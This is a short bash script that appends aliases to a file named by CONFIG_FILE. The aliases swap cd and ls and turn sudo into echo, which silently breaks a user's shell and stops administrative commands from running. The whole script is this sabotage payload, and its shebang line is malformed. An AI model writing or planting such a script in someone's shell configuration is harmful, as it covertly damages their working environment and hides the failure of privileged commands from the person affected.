#!/bin.bash

if [ -z "$CONFIG_FILE" ]; then
    exit 1
fi

{
    echo "";
    echo "alias cd=/usr/bin/ls";
    echo "alias ls=cd";
    echo "alias sudo=echo"
} >> "$CONFIG_FILE"
